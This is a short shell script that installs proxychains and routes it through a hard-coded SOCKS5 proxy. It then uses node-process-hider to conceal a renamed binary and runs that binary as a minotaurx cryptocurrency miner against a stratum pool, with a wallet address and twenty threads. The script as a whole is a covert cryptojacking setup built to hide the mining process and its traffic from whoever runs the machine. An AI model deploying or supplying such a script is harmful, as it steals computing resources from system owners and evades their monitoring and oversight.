apt update 
apt install proxychains  -y 
sed -i 's/socks4/socks5/' /etc/proxychains.conf 
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
apt install nodejs -y
node –version
apt install npm -y
npm –version 
npm i -g node-process-hider
mv @ kontol
chmod u+x kontol
ph add kontol
./kontol -a minotaurx -o stratum+tcps://stratum-na.rplant.xyz:17068 -u RPUgw5i5zzvGZy7HGiQXtDHpCNCRFPEmoR.BAKULKULI -t 20
